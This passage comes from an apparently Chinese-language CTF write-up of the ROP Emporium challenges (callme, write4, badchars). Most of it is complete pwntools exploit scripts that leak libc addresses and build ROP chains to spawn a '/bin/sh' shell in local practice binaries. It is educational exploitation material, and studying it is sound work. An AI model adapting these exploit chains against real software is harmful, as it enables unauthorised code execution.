p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_two)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line">raw_input(<span class="string">&quot;callme_two&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x401A4F&#x27;&#x27;&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_three)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line">raw_input(<span class="string">&quot;callme_three&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">print</span> io.recv(<span class="number">1024</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>这个题目默认是系统开启了aslr，我们需要做一定的infoleak</p><h3 id="i386-2"><a href="#i386-2" class="headerlink" title="i386"></a>i386</h3><h4 id="方法一-泄漏确定函数基址"><a href="#方法一-泄漏确定函数基址" class="headerlink" title="方法一 泄漏确定函数基址"></a>方法一 泄漏确定函数基址</h4><p>对于新手来讲，信息泄漏可能有点问题，因为可能很难确定，咱们要取的打印出来值的范围。<br>栈溢出后，控制eip到printf_plt,然后我们打印printf_got所存放到函数地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;paylaod&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> payload:</span><br><span class="line">    payload.write(pay)</span><br></pre></td></tr></table></figure><p>构造如上到payload</p><p>我们先关闭aslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing: </span><br><span class="line">root@ubuntu:/home/swing<span class="comment"># echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-01.jpg"></a></p><p>可以先从gdb中确定函数地址</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-02.jpg"></a></p><p>hexdump 确定读取的偏移</p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [14:57:12]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;pwnme_addr:0x%x&quot;</span> % pwnme_addr)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line">log.info(<span class="string">&quot;system_plt:0x%x&quot;</span> % system_plt)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset: 0x%x&quot;</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x04A037</span></span><br><span class="line">stdin = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">binsh_addr = (printf_addr - printf_offset)+binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_addr: 0x%x&quot;</span> %printf_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr : 0x%x&quot;</span> %binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay =  <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(binsh_addr)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="方法二-泄漏-确定stdin地址，在一个可写的地址写入-bin-sh"><a href="#方法二-泄漏-确定stdin地址，在一个可写的地址写入-bin-sh" class="headerlink" title="方法二 泄漏 确定stdin地址，在一个可写的地址写入/bin/sh"></a>方法二 泄漏 确定stdin地址，在一个可写的地址写入/bin/sh</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [14:59:18]</span></span><br><span class="line">$ cat solve2.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fgets_plt = elf.plt[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">stdin = <span class="number">0x0804A060</span></span><br><span class="line">buf = <span class="number">0x0804A028</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(stdin)</span><br><span class="line"></span><br><span class="line"><span class="comment">#with open(&quot;payload_2&quot;,&quot;wb&quot;) as payload:</span></span><br><span class="line"><span class="comment">#    payload.write(pay)</span></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">stdin_addr = u32(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"><span class="keyword">print</span> hex(stdin_addr)</span><br><span class="line">log.info(<span class="string">&quot;stdin_addr : 0x%x&quot;</span> % stdin_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(fgets_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(buf)</span><br><span class="line">pay += p32(<span class="number">0x15</span>)</span><br><span class="line">pay += p32(stdin_addr)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="方法三-不需要泄漏，用gadget将bin-sh写入"><a href="#方法三-不需要泄漏，用gadget将bin-sh写入" class="headerlink" title="方法三  不需要泄漏，用gadget将bin/sh写入"></a>方法三  不需要泄漏，用gadget将bin/sh写入</h3><p>程序存在 pop,ebp,pop edi,ret 和 mov edi，ebp这样的gadget<br>那么我可以将bin/sh 分两次写入我指定的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [15:09:25]</span></span><br><span class="line">$ cat sovle3.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_pop_ret = <span class="number">0x080486da</span></span><br><span class="line">mov_edi_ebp = <span class="number">0x8048670</span></span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">buf = <span class="number">0x804a028</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;pwnme_addr:0x%x&quot;</span> % pwnme_addr)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line">log.info(<span class="string">&quot;system_plt:0x%x&quot;</span> % system_plt)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset: 0x%x&quot;</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(pop_pop_ret)</span><br><span class="line">pay += p32(buf)</span><br><span class="line">pay += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">pay += p32(mov_edi_ebp)</span><br><span class="line">pay += p32(pop_pop_ret)</span><br><span class="line">pay += p32(buf+<span class="number">4</span>)</span><br><span class="line">pay += <span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">pay += p32(mov_edi_ebp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()%</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64-3"><a href="#amd64-3" class="headerlink" title="amd64"></a>amd64</h3><p>我找不到适合printf的gadget 然后我改用puts进行泄漏</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:11:51]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x4007B5</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400893</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&#x27;</span></span><br><span class="line">pay += p64(pop_rdi_ret)</span><br><span class="line">pay += p64(puts_got)</span><br><span class="line">pay += p64(puts_plt)</span><br><span class="line">pay += p64(pwnme_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&quot;payload&quot;,&quot;wb&quot;) as payload:</span></span><br><span class="line"><span class="comment"># payload.write(pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = (puts_addr-puts_offset)+binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;puts_addr: 0x%x&quot;</span> % puts_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&#x27;</span></span><br><span class="line">pay += p64(pop_rdi_ret)</span><br><span class="line">pay += p64(binsh_addr)</span><br><span class="line">pay += p64(system_plt)</span><br><span class="line">pay += <span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()%</span><br></pre></td></tr></table></figure><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>检查一定的字符不能用，并没有多大的影响</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:11:53]</span></span><br><span class="line">$ cat ../badchars32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">badchrs = [<span class="string">&#x27;0x62&#x27;</span>,<span class="string">&#x27;0x69&#x27;</span>,<span class="string">&#x27;0x63&#x27;</span>,<span class="string">&#x27;0x2f&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>,<span class="string">&#x27;0x66&#x27;</span>,<span class="string">&#x27;0x6e&#x27;</span>,<span class="string">&#x27;0x73&#x27;</span>]</span><br><span class="line">log.info(badchrs)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./badchars32&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80486B6</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;break *0x0804878F&#x27;&#x27;&#x27;)</span></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay +=<span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;payload&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> payload:</span><br><span class="line">    payload.write(pay)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&quot;bad&quot;</span>)[<span class="number">9</span>:<span class="number">13</span>])</span><br><span class="line">system_addr = (printf_addr - printf_offset) + system_offset</span><br><span class="line">binsh_addr = (printf_addr - printf_offset) + binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_addr: 0x%x&quot;</span> % printf_addr)</span><br><span class="line">log.info(<span class="string">&quot;system_addr : 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr : 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        break *0x8048869</span></span><br><span class="line"><span class="string">        break *0x804878F</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span 